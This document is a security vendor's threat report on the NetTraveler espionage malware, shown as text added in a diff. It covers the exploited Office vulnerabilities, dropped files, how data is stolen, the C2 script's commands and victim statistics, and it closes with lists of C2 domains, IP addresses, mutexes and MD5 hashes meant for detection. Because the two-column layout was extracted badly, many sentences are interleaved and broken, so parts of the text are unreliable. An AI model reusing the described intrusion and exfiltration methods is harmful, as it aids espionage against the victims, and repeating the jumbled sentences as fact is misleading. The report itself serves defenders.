@@ -1,0 +1,4214 @@
+ The NeTTraveler  
+ (aka ‘TravNeT’) 
+
+Author GlobAl r eseArch And An Alysis t eAm
+
+The NeTTraveler
+
+Part 1 (Public):
+
+ > executive summary
+
+ > Attack analysis
+
+ > c&c infrastructure
+
+ > statistics
+
+ > mitigation
+
+ > conclusions
+
+Part 2 (contact us for more information: 
+intelrePorts@kasPersky.com):
+
+ > Victim analysis and profiles
+
+ > command and control (c&c) infrastructure 
+
+and operation
+
+ > Attribution information
+
+2
+
+The NeTTraveler1. executiVe summAry
+
+1. e xecuTive Summary
+
+this report describes multiple cyber-espionage 
+
+campaigns  that  have  successfully  compro-
+
+mised more than 350 high profile victims in 40 
+
+countries. the focus of the paper is to describe 
+
+nettraveler, which is the main tool used by the 
+
+threat actors during these attacks.
+
+ the name “nettraveler” comes from an internal 
+
+string which is present in early versions of the 
+
+servers, we observed how the attackers de-
+
+malware: “nettraveler is running!”. this mal-
+
+ployed different backdoors to the victims’ ma-
+
+ware is used by APt actors for basic surveillance 
+
+chines. these include the malware known as 
+
+of their victims. earliest known samples have a 
+
+“saker” also known as “xbox” (known filenames: 
+
+timestamp of 2005, although references exist 
+
+“update.exe”, “updata.exe” or “xbox.exe”) and 
+
+indicating activity as early as 2004. the largest 
+
+“Pcrat” / ”Zegost”. this report includes a full 
+
+number of samples we observed were created 
+
+description of the “saker/xbox” backdoor as 
+
+between 2010 and 2013.
+
+well.
+
+ Known targets of nettraveler (also known as 
+
+ the attacks use spear-phishing e-mails with 
+
+‘travnet’ or “netfile”) include tibetan/uyghur 
+
+malicious microsoft office documents as attach-
+
+activists, oil industry companies, scientific re-
+
+ments. Gathered data includes file system list-
+
+search  centers  and  institutes,  universities, 
+
+ings, keylogs, various types of documents (.doc, 
+
+private companies, governments and govern-
+
+.xls, .ppt, .pdf, etc...) and other private informa-
+
+mental institutions, embassies and military con-
+
+tion. We have calculated the amount of stolen 
+
+tractors.
+
+data stored on c&c servers to be 22+ gigabytes. 
+
+however this data represents only a small frac-
+
+the nettraveler backdoor is often used together 
+
+tion which we managed to see - the rest of the 
+
+with other malware families. during the anal-
+
+it had been previously downloaded and deleted 
+
+ysis of one of the command and control (c&c) 
+
+from the c&c servers by the attackers.
+
+ 3
+
+ 2. aTTack aNalySiS
+
+nettraveler victims get infected through spear-phishing attacks using office documents 
+
+which exploit two publicly known vulnerabilities -- cVe-2012-0158 and cVe-2010-3333. 
+
+Although these vulnerabilities have been patched by microsoft, they remain effective and 
+
+are among the most exploited in targeted attacks.
+
+during our analysis, we did not see any advanced use of zero-day vulnerabilities or other 
+
+malware techniques such as rootkits. it is therefore surprising to observe that such un-
+
+sophisticated attacks can still be successful with high profile targets.
+
+2.1 Point of entry: sPear-Phishing examPles
+
+We are listing below several nettraveler spear-phishing examples observed during the 
+
+course of this investigation
+
+mD5
+
+29a420e52b56bfadf9f0701318524bef
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+274,291
+
+vulnerability Targeted
+
+cVe-2010-3333
+
+this spear-phish targeted cVe-2010-3333, 
+
+that the target in india received this file titled 
+
+a very popular vulnerability exploited in many 
+
+“Army cyber security Policy 2013.doc”, and 
+
+attacks. the development of this version of 
+
+the accompanying benign and empty decoy 
+
+the exploit delivers a large, easily identified 
+
+Word document is dropped to the temp folder 
+
+“0x4141” noP sled prior to its shellcode, shed-
+
+and opened with Word as “Jallianwala bagh 
+
+ding some light on the immaturity of the devel-
+
+massacre a deeply shameful act.doc” (md5: 
+
+opment behind the effort. more interesting is 
+
+e617348b8947f28e2a280dd93c75a6ad).
+
+4
+
+The NeTTraveler 2. AttAcK AnAlysis
+
+kaspersky lab verdict: exploit.mSWord.
+
+ > %temp%\perf2012.ini
+
+cve-2010-3333.cl
+
+the exploit drops  
+
+ > %temp%\netmgr.dll
+
+ > %temp%\netmgr.exe
+
+ > %temp%\perf2012.ini
+
+ > %temp%\sysinfo2012.dll
+
+ > %temp%\winlogin.exe
+
+the  malware  command  and  control  server 
+
+script is at “hxxp://www.faceboak.net/2012nt/
+
+nettraveler.asp”.
+
+mD5
+
+b600089a93275fa935 
+58695b707b87ad
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+274,291
+
+ > %temp%\enumfs.ini
+
+ > %temp%\dnlist.ini
+
+ > %temp%\sysinfo2012.dll
+
+ > %temp%\winlogin.exe
+
+mD5
+
+6eb5932b0ed20f11f1a 
+887bcfbdde10f
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+274,291
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+Filename: “report - Asia defense spending 
+
+boom.doc”
+
+decoy filename: “report--Asia defense spend-
+
+ing  boom.doc”  (empty)  (md5:  e617348b-
+
+8947f28e2a280dd93c75a6ad)
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+kaspersky lab verdict: exploit.mSWord.
+
+cve-2010-3333.cl
+
+Filename: “invitation.doc”
+
+decoy  filename:  “mailnew.doc”  (empty) 
+
+drops:
+
+kaspersky lab verdict: exploit.mSWord.
+
+ > %windir%\system\config_t.dat
+
+cve-2010-3333.cl
+
+drops:
+
+ > %temp%\netmgr.dll
+
+ > %temp%\netmgr.exe
+
+ > %windir%\system32\enumfs.ini
+
+ > %windir%\system32\dnlist.ini
+
+ > %windir%\system32\iasex.dll
+
+ > %windir%\system32\system_t.dll
+
+ 5
+
+ 
+  
+mD5
+
+917e36946c67414a988f6 
+878d9d0cdfe
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+252,275
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+e-mail spear-phishing sample entitled “his holi-
+
+ness the dalai lama’s visit to switzerland day 4”.
+
+multiple decoy images depicting a large tibetan
+audience, and the dalai lama speaking
+
+Attachment filename: “his holiness the dalai 
+
+drops:
+
+lama’s visit to switzerland day 3.doc”
+
+ > %Appdata%\Adobe\netmgr.dll
+
+decoy filename: “his holiness the dalai lama’s 
+
+ > %Appdata%\Adobe\netmgr.exe
+
+visit to switzerland day 3.doc”
+
+ > %Appdata%\Adobe\perf2012.ini
+
+kaspersky lab verdicts: exploit.mSWord.
+
+ > %Appdata%\Adobe\enumfs.ini
+
+cve-2010-3333.ci
+
+ > %temp%\winlogin.exe
+
+ > %Appdata%\Adobe\sysinfo2012.dll
+
+6
+
+The NeTTraveler 
+ 2. AttAcK AnAlysis
+
+mD5
+
+36ed86602661bb3a7a5 
+5e69fde90ee73
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+252,275
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+kaspersky lab verdict: exploit.mSWord.cve-
+
+2010-3333.ci
+
+drops:
+
+ > %Appdata%\Adobe\netmgr.dll
+
+ > %Appdata%\Adobe\netmgr.exe
+
+Filename: “bJP won’t dump modi for nitish ndA 
+
+ > %Appdata%\Adobe\perf2012.ini
+
+headed for split.doc”
+
+ > %Appdata%\Adobe\sysinfo2012.dll
+
+decoy filename: “bJP won’t dump modi for nitish 
+
+ > %Appdata%\Adobe\enumfs.ini
+
+ndA headed for split.doc”
+
+ > %temp%\winlogin.exe
+
+decoy document with text related to politics in india.
+
+ 7
+
+ 
+mD5
+
+059a7482efee3b2abf67c 
+12d210cb2f7
+
+mD5
+
+151e5d1bb8142835633 
+cfd398e2e0ca3
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+225,139
+
+Size
+
+225,139
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+Filename: “Activity details.doc”
+
+Filename: “the Prayer.doc”
+
+decoy filename: “Activity details.doc” (empty)
+
+decoy filename: “Freedom of speech.doc” (empty)
+
+kaspersky lab verdict: exploit.mSWord.cve-
+
+kaspersky lab verdict: exploit.mSWord.cve-
+
+2010-3333.ci
+
+drops:
+
+2010-3333.ci
+
+ drops
+
+ > %Appdata%\Adobe\netmgr.dll
+
+ > %Appdata%\Adobe\netmgr.dll
+
+ > %Appdata%\Adobe\netmgr.exe
+
+ > %Appdata%\Adobe\netmgr.exe
+
+ > %Appdata%\Adobe\perf2012.ini
+
+ > %Appdata%\Adobe\ie.log
+
+ > %temp%\winlogin.exe files.
+
+ > %Appdata%\Adobe\perf2012.ini
+
+ > %temp%\winlogin.exe
+
+mD5
+
+63494c74db9bfc2bba 
+3983698c952de9
+
+mD5
+
+f4f14d4a1e34f62eeb9 
+a90b5c8b2cfc1
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+create date (GmT)
+
+2011-04-27 10:10:00
+
+Size
+
+234,355
+
+Size
+
+225,139
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+vulnerability 
+Targeted
+
+cVe-2010-3333
+
+Filename: “Fax13-0417.doc”
+
+decoy filename: “report.doc” (empty)
+
+decoy filename: “Fax13-0417.doc” (empty)
+
+kaspersky lab verdict: exploit.mSWord.cve-
+
+Filename: “23948-report.doc”
+
+kaspersky lab verdict: exploit.mSWord.cve-
+
+2010-3333.ci
+
+2010-3333.ci
+
+ drops
+
+ drops
+
+ > %Appdata%\Adobe\netmgr.dll
+
+ > %Appdata%\Adobe\netmgr.dll
+
+ > %Appdata%\Adobe\netmgr.exe
+
+ > %Appdata%\Adobe\netmgr.exe
+
+ > %Appdata%\Adobe\enumfs.ini
+
+ > %Appdata%\Adobe\perf2012.ini
+
+ > %Appdata%\Adobe\perf2012.ini
+
+ > %Appdata%\Adobe\sysinfo2012.dll
+
+ > %temp%\winlogin.exe
+
+ > %Appdata%\Adobe\enumfs.ini
+
+ > %temp%\winlogin.exe
+
+8
+
+The NeTTraveler 2. AttAcK AnAlysis
+
+mD5
+
+ e5954b8204eb321d 
+20bed4a86b3cef34
+
+mD5
+
+ 0e2b10015fe52b7ea77 
+a213f0c330557
+
+create date (GmT)
+
+create date (GmT)
+
+ 2012-06-29 08:31:45
+
+Size
+
+414,703
+
+Size
+
+ 222,208
+
+vulnerability 
+Targeted
+
+ cVe-2010-3333
+
+vulnerability 
+Targeted
+
+ cVe-2012-0158
+
+Filename: “Alban tushaal Jagsaalt.doc”
+
+Filename: “data.xls” (empty decoy)
+
+decoy filename: “document.doc” (mongolian 
+
+kaspersky lab verdict: exploit.Win32.cve- 
+
+text)
+
+2012-0158.y
+
+kaspersky lab verdict: exploit.mSWord.cve- 
+
+ drops:
+
+2010-3333.ci
+
+ drops
+
+ > %temp%\smcs.exe
+
+ > %windir%\system\config_t.dat
+
+ > %temp%\enumfs.ini
+
+ > %temp%\sysinfo2012.dll
+
+ > %temp%\dnlist.ini
+
+ > %temp%\netmgr.dll
+
+ > %windir%\system32\6to4ex.dll
+
+ > %temp%\perf2012.ini
+
+ > %windir%\system32\svchost.log
+
+ > %temp%\netmgr.exe
+
+decoy document with mongolian writing
+
+ 9
+
+2.3 i nstalled malware, functionalit y, 
+Persistence
+
+ nettraveler is an automatic data exfiltration tool, designed to extract large amounts 
+
+of private information from the victim’s system over long periods of time. the malware 
+
+uses compression techniques and a fail-safe protocol to ensure that uploaded data is 
+
+safely transferred to the attacker’s c2s.
+
+ by default, nettraveler exfiltrates common file 
+
+it is clear that the attackers are also collecting 
+
+types such as doc, xls, PPt, rtF and PdF. For 
+
+files of type “.cdr” (corel draw designs), “.dwg”, 
+
+a full list, see the detailed backdoor analysis 
+
+“.dxf”, “.cdw”, “.dwf” (AutocAd projects) and 
+
+below. the backdoor configuration can however 
+
+some configuration files “.cfn” and “.cfg”.
+
+be extended with special options to steal other 
+
+file types. here’s one such extended configura-
+
+ the various parameters of the malware are con-
+
+tion recovered from an attack against a victim 
+
+figured with a builder, which allows the attackers 
+
+working in the oil industry:
+
+to change things such as the list of stolen files 
+
+extensions, c2 address and so on:
+
+10
+
+The NeTTraveler 2. AttAcK AnAlysis
+
+nettraveler configuration Gui
+
+2.4 exfiltrated data
+
+exfiltrated data is encoded with a custom compression and encoding library, which pro-
+
+duces files which resemble bAse64. the data is transferred to the command and control 
+
+servers via httP requests such as:
+
+ 11
+
+2.5 overla P with red 
+october
+
+2.6 connections with 
+other camPaigns
+
+note: for our analysis of the red october cam-
+
+to better identify core nettraveler actors and 
+
+paign,  see:  https://www.securelist.com/en/
+
+delineate the groups from one another, we 
+
+blog/785/the_red_october_campaign_An_
+
+collect and categorize various tactics, tech-
+
+Advanced_cyber_espionage_network_target-
+
+niques, and Procedures (ttPs) employed by 
+
+ing_diplomatic_and_Government_Agencies
+
+these adversaries throughout their operations. 
+
+the attacker’s iP operation ranges, overlaps 
+
+during our analysis of nettraveler infections, 
+
+with that of a malware family known as “Ze-
+
+we identified several victims that were infected 
+
+gost”. For instance, one of the command and 
+
+both by nettraveler and red october. Although 
+
+control servers that is part of the infrastruc-
+
+we see no direct links between the nettraveler 
+
+ture, is a well-known c2 for multiple Zegost 
+
+attackers and the red october threat actor, the 
+
+variants, still active as of may 2013. the tar-
+
+existence of victims infected by both of these 
+
+gets and command and control domain naming 
+
+campaigns is interesting.
+
+scheme indicates a connection between the 
+
+these victims are:
+
+lurid/enfal attackers and nettraveler. some 
+
+of the nettraveler c2’s are used to distribute 
+
+ > A military contractor in russia
+
+a malware known as “saker” or “xbox”, which 
+
+ > An embassy in iran
+
+ > An embassy in belgium
+
+ > An embassy in Kazakhstan
+
+is delivered as an “update” to the nettraveler 
+
+victims.
+
+ > An embassy in belarus
+
+note:  more  details  about  the  connections 
+
+ > A Government entity in tajikistan
+
+between  nettraveler  and  other  campaigns 
+
+these infections indicate that certain high profile 
+
+is  available  in  our  private  report. c ontact 
+
+victims are targeted by multiple threat actors; 
+
+us  at intelreports@kaspersky.com  for  more 
+
+the target information is a valuable commodity.
+
+details.
+
+12
+
+The NeTTraveler3. commAnd And control serVers And inFrAstructure
+
+3. commaND aND coNTrol 
+
+ServerS aND iNfraSTruc Ture
+
+during our monitoring period, we observed more than 100 command and control urls, 
+
+pointing to multiple servers in the united states, china and hong Kong.
+
+ the command and control servers generally run 
+
+iis 6/7, as the c2 backend is an AsP (microsoft 
+
+aasogspread.asp,  adfsdfclnggsldfc.asp, 
+
+Active server Pages) script.
+
+advertisingservicesa3sb.asp,  aney wsf.
+
+a s p,   a p p l e . a s p,   a p p l e b a g 0 0 5 . a s p, 
+
+to transfer stolen data from the command and 
+
+azarweforrell.asp,  azofjeljgo648rl.asp, 
+
+control servers, the attackers use FtP on top 
+
+certify.asp, dochunter.asp, dochunter1.asp, 
+
+of VPn connections through a server in the us 
+
+dochunteradfaefaer.asp,  fish.asp,  happy.
+
+hosted by Krypt technologies. the infrastructure 
+
+asp, heritage.asp, huyuio67.asp, little.asp, 
+
+is secured by allowing FtP access only to remote 
+
+madmaswhbe.asp, nethttpfile.asp, netpass.
+
+users coming from predefined iPs, including the 
+
+asp, nettraveler.asp, orphaned.asp, rice.asp, 
+
+VPn provider in the us.
+
+sabcfsf.asp, shenghai.asp, time.asp, update.
+
+asp, weathobloe.asp, yegnfvhemc.asp
+
+during our investigation, we analyzed several 
+
+hundred nettraveler samples and configuration 
+
+files, which use more than 30 different c&c serv-
+
+All the known command and control servers per-
+
+ers. the list below includes the script names that 
+
+form the same basic functions - for a description 
+
+we have seen on these servers and confirmed 
+
+of the supported functionality, see below.
+
+as malicious:
+
+ 13
+
+14
+
+The NeTTraveler3. commAnd And control serVers And inFrAstructure
+
+ 3.1 d escriP tion of c2 scriP t functionalit y
+
+the main function of command and control servers is to collect stolen data from the 
+
+victims. stolen data is stored in the exact format it was sent from the victim’s Pc, without 
+
+any additional encoding or obfuscation.
+
+ here’s a listing of how a folder storing stolen victim data could look on the c&c server:
+
+the uploaded data can be either a document file, a keylogger backlog or a system infor-
+
+mation profile. here’s how a decoded system information profile looks like:
+
+ 15
+
+ 
+ 
+system profile, filename is of the form ‘@@@dll@@@travlerbackinfo-[date/time].bak’
+
+the system profile includes an iPconFiG output as well as a list of user accounts in the 
+
+machine. if the malware install includes the “netPass” module, a keylogger will silently 
+
+collect all typed data, together with window names. this produces logs like the following 
+
+(in decoded format):
+
+sample decrypted log from the keylogging module
+
+16
+
+The NeTTraveler3. commAnd And control serVers And inFrAstructure
+
+the command and control scripts implement several functions to communicate with the 
+
+victim; during our analysis, we observed four different generations of these scripts, with 
+
+various degrees of complexity. the main function of the c&c script saves stolen data to 
+
+a folder in the c2 root, unless the request variable “action” is defined, in which case, it 
+
+performs one of the following commands:
+
+command 
+“action”)
+
+Purpose
+
+script 
+generation
+
+nettraveler.asp
+
+read list of commands from the configuration file (eg. “nettraveler.
+txt”) and send it to the victim. commands can be “uninstAll”, 
+“reset”, “uPdAte”, “uPloAd”. For a description of these com-
+mands see the technical appendix.
+
+report to the c2 a successful exfiltration of victim’s data.
+
+nettraveler.asp
+
+read a template file (eg. “email.eml”) and send to victim
+
+nettraveler.asp
+
+delete template from c2 (“email.eml”)
+
+nettraveler.asp
+
+report filesize of additional backdoor module (eg. “updata.exe”)
+
+nettraveler.asp
+
+Get specific individual commands to be executed on the victim’s 
+machine.
+
+nettraveler.asp
+
+delete specific individual command for the victim from the c2
+
+nettraveler.asp
+
+send a specific text file from the c2 to the victim (eg. “nethttpfile.
+txt”)
+
+getdata
+
+updated
+
+getemail
+
+gotemail
+
+datasize
+
+getcmd
+
+gotcmd
+
+gettext
+
+downloaded
+
+same as “updated” command
+
+downloadsize, 
+updatesize
+
+same as datasize
+
+happy.asp
+
+happy.asp
+
+happy.a
+
+the command and control scripts reply to the 
+
+under normal operation, a victim can connect 
+
+victim with either “success:<size>” or “Fail!”, de-
+
+to the c2 every five seconds and upload chunks 
+
+pending on the result of the operation. in some 
+
+of data from the victim, until the entire file is 
+
+cases, instead of the “Fail” string, a more de-
+
+successfully transferred. in case of errors, the 
+
+tailed error is sent back to the victim, in simpli-
+
+malware continues to send the data over and 
+
+fied chinese:
+
+over, until they succeed.
+
+“无法删除!” - means “can not be deleted!”
+
+“该文件不存在!” - means “the file does not exist!”
+
+ 17
+
+4. Global iNfecTioN STaTiSTicS
+
+during our analysis, we obtained infection logs from several command and control 
+
+servers. the logs, which go back as far as 2009, show that the threat actors behind 
+
+nettraveler successfully infected more than 350 victims in 40 countries. the following 
+
+map shows the locations and profile of the victims:
+
+18
+
+The NeTTraveler4. GlobAl inFection stAtistics
+
+the following map lists the victim profiles by industries:
+
+Diplomatic 32%
+
+Government 19%
+
+Press 1%
+
+IT 3%
+
+Financial 3%
+
+Health 2%
+
+Activism 3%
+
+Research 4%
+
+Airspace 6%
+
+Industrial and 
+Infrastructure 7%
+
+Military 9%
+
+Private 11%
+
+Note: chart does not include the victims that couldn’t be identified
+
+in addition to the data from the command and 
+
+besides the c&c logs and Ksn, we have also 
+
+control servers, we collected statistics regarding 
+
+sinkholed  two  of  the  c&c  domains  used  by 
+
+detections of nettraveler from the Kaspersky 
+
+nettraveler:
+
+security network. the top 10 infected coun-
+
+ >  pkspring.net
+
+tries as reported in Ksn (Kaspersky security 
+
+ > yangdex.org
+
+network):
+
+Position
+
+ country
+
+ % of total
+
+ 1
+
+ 2
+
+ 3
+
+ 4
+
+ 5
+
+ 6
+
+ 7
+
+ 8
+
+ 9
+
+ mongolia
+
+ russia
+
+ india
+
+ Kazakhstan
+
+ Kyrgyzstan
+
+ china
+
+ tajikistan
+
+ south Korea
+
+ spain
+
+ 10
+
+ Germany
+
+ 29%
+
+ 19%
+
+ 11%
+
+ 11%
+
+ 5%
+
+ 3%
+
+ 3%
+
+ 2%
+
+ 2%
+
+ 1%
+
+ the data set collected so far from the sinkhole 
+
+is relatively small and includes victims in mon-
+
+golia, south Korea and india. We will continue 
+
+to monitor the connections and over time, up-
+
+date this paper with more data as it becomes 
+
+available.
+
+Note: Taking into account that several other C&C 
+
+servers exist for which we have no logs and the KSN 
+
+coverage, we estimate the total number of victims 
+
+worldwide to be around ~1,000.
+
+ 19
+
+5. mi TiGaTioN iNformaTioN
+
+From the point of view of the victims, the most 
+
+ > 213.156.6.122 - c2 (cultureacess.com)
+
+important part of any report is information on 
+
+ > 209.130.115.38 - c2 (tsgoogoo.net)
+
+how to detect and eradicate the infections. in 
+
+ > 98.143.145.80 - c2 (spit113.minidns.
+
+addition to running a modern security suite ca-
+
+net)
+
+pable of detecting nettraveler, things such as 
+
+ > 96.46.4.237 - c2 (sghrhd.190.20081.
+
+filenames or c2 iPs can be extremely useful to 
+
+info)
+
+system administrators.
+
+ > 109.169.86.178 - c2 (imapupdate.com)
+
+ > 125.67.89.156 - c2 (faceboak.net)
+
+this part of the report includes:
+
+ > 142.4.96.6 - c2 (buynewes.com)
+
+ > indicators of compromise
+
+ > 124.115.21.209 - c2 iP
+
+ > Kaspersky detection names
+
+ > 67.198.140.148 - c2 (southstock.net)
+
+ > md5s of known samples
+
+ > 9 6.4 4.179. 26  -  c 2 
+
+(vip222idc.
+
+s169.288idc.com)
+
+ > 235.22.123.90 - c2 (gami1.com)
+
+ > 178.77.45.32 - c2 (ra1nru.com)
+
+5.1 indicators of 
+comPromise:
+
+command  and  control  domains  and  server 
+
+t y Pes oF ioc s:
+
+network traffic / iPs
+
+names:
+
+ > allen.w223.west263.cn
+
+ > andriodphone.net
+
+ > bauer.8866.org
+
+ > 209.11.241.144 - mothership, VPn serv-
+
+ > buynewes.com
+
+er, c2
+
+ > cultureacess.com
+
+ > 121.12.124.69  -  c 2  (allen.w223.
+
+ > discoverypeace.org
+
+west263.cn)
+
+ > drag2008.com
+
+ > 61.178.77.111 - c2 (wolf0.3322.org)
+
+ > eaglesey.com
+
+ > 182.50.130.68 - c2 (viprambler.com)
+
+ > enterairment.net
+
+ > 103.20.192.59 - c2 (sunshine.59.ydli.net)
+
+ > faceboak.net
+
+20
+
+The NeTTraveler 
+5. mitiGAtion inFormAtion
+
+ > gami1.com
+
+ > globalmailru.com
+
+ > hint09.9966.org
+
+ > imapupdate.com
+
+ > inwpvpn.com
+
+ > keyboardhk.com
+
+ > localgroupnet.com
+
+ > mailyandexru.com
+
+ > msnnewes.com
+
+ > newesyahoo.com
+
+ > newfax.net
+
+ > main  active  group(s)  in  2013,  unique 
+
+configuration  filenames:  perf2012.
+
+ini, config_t.dat, config_shenghai.dat, 
+
+pert2012.ini, in:
+
+• c:\documents and settings\[user]\
+
+local settings\temp\
+
+• c:\users\[user]\local settings\temp\
+
+• c:\WindoWs\temp\
+
+• c:\WindoWs\system\
+
+ > other (older) variants, configs: FmiFen.ini 
+
+in:
+
+ > pkspring.net - sinkholed by Kaspersky 
+
+• %system%
+
+lab
+
+ > ra1nru.com
+
+ > ramb1er.com
+
+ > malware body: net.exe, netmgr.exe, net 
+
+mgr.dll in
+
+• c:\
+
+ > sghrhd.190.20081.info
+
+• c:\WindoWs\system\
+
+ > southstock.net
+
+ > spit113.minidns.net
+
+ > tsgoogoo.net
+
+ > vip222idc.s169.288idc.com
+
+ > viplenta.com
+
+ > vipmailru.com
+
+ > viprainru.com
+
+ > viprambler.com
+
+ > vipyandex.com
+
+ > vpnwork.3322.org
+
+ > wolf0.3322.org
+
+ > wolf001.us109.eoidc.net
+
+ > yahooair.com
+
+• %system%
+
+• %temp%
+
+• c:\WindoWs\temp\
+
+• %appdata%\Adobe\
+
+ > other (older) variants, malware bodies:
+
+• %system%\bootuid.dll
+
+• %system%\wuaucit.exe
+
+• %system%\6to4ex.dll
+
+• %temp%\Process.dll
+
+• %temp%\Process.dll_d
+
+• %temp%\cmss.exe
+
+• %temp%\sysinfo2012.dll
+
+• %temp%\winlogin.exe
+
+ > yangdex.org - sinkholed by Kaspersky 
+
+• %windir%\system32\iasex.dll
+
+lab
+
+ > zeroicelee.com
+
+• %windir%\system32\system_t.dll
+
+• %temp%\smcs.exe
+
+malware file names on disk:
+
+• %appdata%\Adobe\sysinfo2012.dll
+
+ 21
+
+ > Artifacts during installation and running:
+
+• %temp%\Win32en.bat
+
+• %system%\dnlist.ini
+
+• %temp%\dnlist.ini
+
+5.2 malware names by 
+KasP ersK y P roducts
+
+• %appdata%\Adobe\ie.log
+
+detection names for the malware modules and 
+
+• %temp%\ie.log
+
+• %system%\enumfs.ini
+
+• %temp%\enumfs.ini
+
+• %system%\install.tmp
+
+• %system%\kyrecord.txt
+
+related files:
+
+ > backdoor.Win32.bifrose.bcx
+
+ > trojan-dropper.Win32.dorifel.acrn
+
+ > trojan-dropper.Win32.dorifel.acsj
+
+ > trojan-dropper.Win32.dorifel.acsm
+
+• c:\documents and settings\<user>\
+
+ > trojan-dropper.Win32.dorifel.acuf
+
+start menu\Programs\startup\seru-
+
+ > trojan-dropper.Win32.dorifel.cql
+
+vice.lnk
+
+ > trojan-dropper.Win32.dorifel.fhg
+
+• c:\documents and settings\<user>\
+
+ > trojan-dropper.Win32.dorifel.fny
+
+start menu\Programs\startup\net-
+
+ > trojan-dropper.Win32.dorifel.iat
+
+mgr.lnk
+
+ > trojan-dropper.Win32.dorifel.jam
+
+• c :\d o c u m e ~1\< u s e r > ~1\l o  
+
+ > trojan-dropper.Win32.dorifel.kcy
+
+cAls~1\temp\recycler_w\Allindex.
+
+ > trojan-dropper.Win32.dorifel.ylt
+
+ini
+
+ > trojan-spy.Win32.travnet.*
+
+• c :\d o c u m e ~1\< u s e r > ~1\l o  
+
+ > trojan.multi.yahg.a
+
+cAls~1\temp\recycler_w\Allindex.
+
+ > trojan.Win32.Agent2.eakj
+
+ini_d
+
+ > trojan.Win32.Agent2.exms
+
+ > trojan.Win32.Agent2.ezgb
+
+mutexes created during backdoor operation:
+
+ > trojan.Win32.Agent2.fdhs
+
+ > boat-12 is running!
+
+ > dochunter2012 is running!
+
+ > hunter-2012 is running!
+
+ > nt-2012 is running!
+
+ > nettravler is running!
+
+ > nettravler2012 is running!
+
+ > sh-2011 is running!
+
+ > shenghai is running!
+
+22
+
+ > trojan.Win32.delf.dgmw
+
+ > trojan.Win32.delf.dgmx
+
+ > trojan.Win32.Genome.agyil
+
+ > trojan.Win32.Genome.aiunu
+
+ > trojan.Win32.Genome.ajeqr
+
+ > trojan.Win32.Genome.akqco
+
+ > trojan.Win32.Genome.aksho
+
+ > trojan.Win32.Jorik.travnet.*
+
+ > not-a-virus:downloader.Win32.nettrav 
+
+eler.*
+
+The NeTTraveler5. mitiGAtion inFormAtion
+
+Kaspersky  detection  names  for  malicious 
+
+1a70e1e36e6afa454f6457140ac3d2ec
+
+documents  with  embedded  exploits  used  in 
+
+1dcad7c8f56207b2c423353f0c328755
+
+spear-phishing attacks:
+
+1f26e5f9b44c28b37b6cd13283838366
+
+ > exploit.msWord.cVe-2010-3333.cg
+
+209c3b51cad30c85ca79a9f067ce04cd
+
+ > exploit.msWord.cVe-2010-3333.ci
+
+22be9cca6e4ec3af327595b890a92fec
+
+ > exploit.msWord.cVe-2010-3333.cl
+
+28e9faec9de3bbdeb65435bfc377d1f8
+
+ > exploit.Win32.cVe-2012-0158.y
+
+294da087e6329ae78c1a5fb42b999500
+
+ > exploit.msWord.cVe-2012-0158.an
+
+29a394a4ec8a30b5f36c7b874fc9fe10
+
+ > exploit.msWord.cVe-2012-0158.ax
+
+2a43c23a17cd2bc9074a486c47444e7c
+
+ > exploit.Win32.cVe-2012-0158.aa
+
+2ac8f77548e87b401767c7076adfa00d
+
+5.3 md5s of malicious files
+
+2d0e4748d857c12184ed2c94c13ec1ae
+
+2dc139d82a2a5bf027bcb6a40f75b3f4
+
+33334d8dc36c4ee7739fe2f8b448da72
+
+36f9a0e71f0b580333c61bfeaa88df39
+
+37d588b289c65f10c256e43eba939a0a
+
+382c1d692dd3cec9b046e5c0eeaf92e6
+
+spear-phishing samples md5s:
+
+39c2b2ee24373bf1ef20faff958718bc
+
+36ed86602661bb3a7a55e69fde90ee73
+
+3b4cf5f1ff8c4187e41c6ab80f000491
+
+6eb5932b0ed20f11f1a887bcfbdde10f
+
+3cb96fe79aa01c82ac68c54e88918e57
+
+059a7482efee3b2abf67c12d210cb2f7
+
+482f112cb7cb0293d99f8a7606acbe85
+
+e5954b8204eb321d20bed4a86b3cef34
+
+4968882f189236952fd38a11586b395a
+
+63494c74db9bfc2bba3983698c952de9
+
+4c8950da250ea135ee77a2644af414ba
+
+b600089a93275fa93558695b707b87ad
+
+524aed944b7f307eea5677eda7e2079a
+
+f4f14d4a1e34f62eeb9a90b5c8b2cfc1
+
+54583ccc97c33e358510b563b1536e69
+
+0e2b10015fe52b7ea77a213f0c330557
+
+57f2374d9f2a787339b0c6a5b1008a72
+
+29a420e52b56bfadf9f0701318524bef
+
+5e35b31472a2e603a995198d8e8411ed
+
+malware modules:
+
+5e7c5e8d9f5864488ddf04b662d1ad8e
+
+63f0f91e3ccf5dd00a455d3038a299f4
+
+66684b8b82fb5318a41ab7e6abb8dd42
+
+01d06f85fce63444c3563fe3bd20c004
+
+677f7c42f79a0a58760056529739fdd6
+
+03e8d330abc77a6a9d635d2e7c0e213a
+
+6afeec03c8f4bc78fa2b3ad27392b0e7
+
+08e5352a2416bd32a1c07f2d6c2f11fa
+
+6d00e4f95fba02126b32bb74dc4fec55
+
+13b3cb819b460591c27e133e93fb8661
+
+6d49cdbade7541d46be3fb47a0f563bb
+
+19a0693480c82f2b7fc8659d8f91717a
+
+6de813a22b2b73e330085ec7c85e041b
+
+ 23
+
+71f311a648348e7598eb55ab7618842c
+
+b990752f8266d7648070bea7e24d326f
+
+723129912a2d0fb4aede7100071787ef
+
+ba026e6190aee2c64ef62a4e79419bcf
+
+778c1764dd5c36c1eb96c49a8f8441e6
+
+bea6e3481c0a06ce36600d8b3cc6155b
+
+7b92e9d21bc4db838bc102b289f4fd5f
+
+c87e8a3ceefd93c7e431b753801c6bb6
+
+812d8e4d7a484bb363b139cfa08617e5
+
